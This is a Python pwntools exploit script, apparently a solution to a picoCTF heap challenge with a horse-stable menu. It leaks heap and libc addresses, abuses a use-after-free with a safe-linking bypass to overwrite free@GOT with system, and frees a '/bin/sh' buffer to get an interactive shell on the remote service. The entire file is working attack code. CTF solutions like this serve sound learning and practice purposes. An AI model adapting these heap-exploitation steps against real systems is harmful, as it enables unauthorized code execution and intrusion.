from pwn import *

#context.log_level = 'debug'

host = 'saturn.picoctf.net' 
port = 50122

ld_path = './lib/ld-linux.so'
libc_path = './lib/libc.so'
binary = './vuln'

'''
r = process([ld_path, binary], env={
    'LD_PRELOAD': libc_path,
    'LD_LIBRARY_PATH': './lib'
})
'''

r = remote(host, port)

libc = ELF(libc_path)
elf = ELF(binary)

def sendl_after(pattern, payload):
	r.recvuntil(pattern)
	r.sendline(payload)

current_idx = 0
name_len = b'256'
eof = p8(0xff)

# Heap leak

sendl_after(b'Choice: ', b'1')
sendl_after(b'Stable index # (0-17)? ', b'1')
sendl_after(b'Horse name length (16-256)? ', b'16')
sendl_after(b'Enter a string of 16 characters: ', b'z' * 16)

sendl_after(b'Choice: ', b'2')
sendl_after(b'Stable index # (0-17)? ', b'1')

sendl_after(b'Choice: ', b'1')
sendl_after(b'Stable index # (0-17)? ', b'1')
sendl_after(b'Horse name length (16-256)? ', b'16')
sendl_after(b'Enter a string of 16 characters: ', eof)

while current_idx < 5:
	if current_idx == 1: current_idx += 1; continue

	sendl_after(b'Choice: ', b'1'); sendl_after(b'Stable index # (0-17)? ', str(current_idx).encode())
	sendl_after(b'Horse name length (16-256)? ', b'16')
	sendl_after(b'Enter a string of 16 characters: ', b'z' * 16)

	current_idx += 1

sendl_after(b'Choice: ', b'3')

r.recvuntil(b'|')

leaked_raw = r.recv(16).strip()

while len(leaked_raw) < 8:
	leaked_raw += b'\0'

heap_base = u64(leaked_raw) << 12

print(f'[+] Heap : {hex(heap_base)}')

# Libc leak

current_idx = 0

while current_idx < 5:
	sendl_after(b'Choice: ', b'2')
	sendl_after(b'Stable index # (0-17)? ', str(current_idx).encode())

	current_idx += 1

current_idx = 0

while current_idx < 8:
	sendl_after(b'Choice: ', b'1')
	sendl_after(b'Stable index # (0-17)? ', str(current_idx).encode())
	sendl_after(b'Horse name length (16-256)? ', name_len)
	sendl_after(b'Enter a string of 256 characters: ', b'z' * 255)
	r.sendline(eof)

	current_idx += 1

current_idx = 1

while current_idx < 8:
	sendl_after(b'Choice: ', b'2')
	sendl_after(b'Stable index # (0-17)? ', str(current_idx).encode())

	current_idx += 1

sendl_after(b'Choice: ', b'2')
sendl_after(b'Stable index # (0-17)? ', b'0')

sendl_after(b'Choice: ', b'1')
sendl_after(b'Stable index # (0-17)? ', b'0')
sendl_after(b'Horse name length (16-256)? ', b'80')
sendl_after(b'Enter a string of 80 characters: ', b'W' * 1)
r.sendline(eof)

current_idx = 1

while current_idx < 5:	
	sendl_after(b'Choice: ', b'1')
	sendl_after(b'Stable index # (0-17)? ', str(current_idx).encode())
	sendl_after(b'Horse name length (16-256)? ', b'16')
	sendl_after(b'Enter a string of 16 characters: ', b'z' * 15)
	r.sendline(eof)

	current_idx += 1

sendl_after(b'Choice: ', b'3')
r.recvuntil(b'W')
main_arena_leak = u64(b'\0' + r.recv(5) + b'\0\0')

arena2base = 0x1bdd00
libc.address = main_arena_leak - arena2base

print(f'[+] Main arena : {hex(main_arena_leak)}')
print(f'[+] Libc : {hex(libc.address)}')

# Make /bin/sh\x00 buf

sendl_after(b'Choice: ', b'1')
sendl_after(b'Stable index # (0-17)? ', b'10')
sendl_after(b'Horse name length (16-256)? ', b'16')
sendl_after(b'Enter a string of 16 characters: ', b'/bin/sh\x00')
r.sendline(eof)

sendl_after(b'Choice: ', b'1')
sendl_after(b'Stable index # (0-17)? ', b'12')
sendl_after(b'Horse name length (16-256)? ', b'16')
sendl_after(b'Enter a string of 16 characters: ', b'/bin/sh\x00')
r.sendline(eof)

sendl_after(b'Choice: ', b'2')
sendl_after(b'Stable index # (0-17)? ', b'12')

# Use after free

sendl_after(b'Choice: ', b'2')
sendl_after(b'Stable index # (0-17)? ', b'1')

sendl_after(b'Choice: ', b'0')
sendl_after(b'Stable index # (0-17)? ', b'1')

target = elf.got['free']
current = heap_base + 0x630
save_linked_target = (current >> 12) ^ (target & ~0xf)
system = libc.address + 0x49850  # system offset

print(f'[+] free@got.plt : {hex(target)}')
print(f'[+] system : {hex(system)}')

sendl_after(b'Enter a string of 16 characters: ', p64(save_linked_target))
r.sendline(eof)

sendl_after(b'New spot? ', b'10')

sendl_after(b'Choice: ', b'1')
sendl_after(b'Stable index # (0-17)? ', b'15')
sendl_after(b'Horse name length (16-256)? ', b'16')
sendl_after(b'Enter a string of 16 characters: ', b'a' * 14)
r.sendline(eof)

pause()
sendl_after(b'Choice: ', b'1')
sendl_after(b'Stable index # (0-17)? ', b'11')
sendl_after(b'Horse name length (16-256)? ', b'16')
sendl_after(b'Enter a string of 16 characters: ', b'a' * 8 + (p64(system))[:-1])
r.sendline(eof)

# Trigger __free_hook

pause()
sendl_after(b'Choice: ', b'2')
sendl_after(b'Stable index # (0-17)? ', b'10')

r.interactive()
